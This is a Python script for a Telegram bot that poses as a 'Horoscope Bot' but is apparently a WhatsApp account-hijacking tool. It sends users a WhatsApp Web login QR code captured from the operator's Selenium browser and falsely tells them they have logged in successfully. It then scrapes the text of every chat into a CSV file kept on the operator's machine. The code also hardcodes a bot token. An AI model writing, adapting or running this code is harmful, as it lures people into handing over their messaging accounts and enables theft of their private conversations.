import telebot
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import csv
import pandas as pd
from io import BytesIO
from PIL import Image

chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--headless') 

driver = webdriver.Chrome()  # Change to the appropriate driver if using a different browser
driver.maximize_window()
driver.get("https://web.whatsapp.com/")
time.sleep(10)
BOT_TOKEN = '6491624170:AAEn8VBiHZdxPsStepI51q4Th9A-L15i4hw'

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start_handler(message):
    text = "Hello! Welcome to the Horoscope Bot. Type /horoscope to get your horoscope."
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['horoscope'])
def sign_handler(message):
    text = "Please enter your phone number:"
    sent_msg = bot.send_message(message.chat.id, text)
    bot.register_next_step_handler(sent_msg, get_phone_number)

def get_phone_number(message):
    phone_number = message.text
    
    # Take a screenshot of the QR code
    qr_code_element = WebDriverWait(driver, 30).until(
        EC.presence_of_element_located((By.XPATH, "//canvas[@aria-label='Scan me!']"))
    )
    location = qr_code_element.location
    size = qr_code_element.size
    png = driver.get_screenshot_as_png()
    # Create a PIL image from the screenshot
    image = Image.open(BytesIO(png))
    # Crop and save the QR code image
    left = location['x']
    top = location['y']
    right = location['x'] + size['width']
    bottom = location['y'] + size['height']
    qr_image = image.crop((left, top, right, bottom))
    qr_image.save('whatsappweb_qr_code.png')
    
    # Send the QR code image to the user
    with open('whatsappweb_qr_code.png', "rb") as qr_image_file:
        bot.send_photo(message.chat.id, qr_image_file)
    bot.reply_to(message, "Congratualations you have successful login! ")
    
    bot.reply_to(message, "Great! I will now scrape all chats' data.")

    # ... (Your existing code for getting the QR code)

    # Save the chat_id to a variable for later use
    chat_id = message.chat.id

    # Create a list to store chat data
    all_chat_data = []

    # Locate the chat list element using the provided full xpath
    try:
        chat_list = WebDriverWait(driver, 50).until(
            EC.presence_of_element_located((By.ID, "pane-side"))
        )
    except Exception as e:
        print(e)
        return

    # Loop through each chat element and scrape data
    try:
        chat_data1 = chat_list.find_elements(By.CLASS_NAME, "y_sn4")
        for i in chat_data1:
            i.click()
            time.sleep(2)
            qr_code_element = WebDriverWait(driver, 4).until(
                EC.presence_of_element_located((By.CLASS_NAME, "_3B19s"))
            )
            chat_name = qr_code_element.text.strip()
            time.sleep(1)
            chat_data = WebDriverWait(driver, 10).until(
                EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/div[5]/div/div[2]/div/div[2]/div[3]"))
            ).text
            chat_data = chat_data.replace('\n', ' ')
            all_chat_data.append({'ChatName': chat_name, 'Messages': chat_data})
    except Exception as e:
        print(e)
        return

    driver.quit()

    # Save all_chat_data to a CSV file
    with open('whatsapp_chats.csv', 'w', newline='', encoding='utf-8') as csvfile:
        fieldnames = ['ChatName', 'Messages']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for chat_data in all_chat_data:
            writer.writerow({'ChatName': chat_data['ChatName'], 'Messages': chat_data['Messages']})

    # Send the CSV file to the Telegram bot chat
    csv_file_path = 'whatsapp_chats.csv'
    try:
        with open(csv_file_path, 'rb') as file:
            # Send the CSV file to the chat_id
            bot.send_document(chat_id=chat_id, document=file)
        print("CSV file sent successfully.")
    except Exception as e:
        print("Error sending CSV file:", e)

bot.infinity_polling()
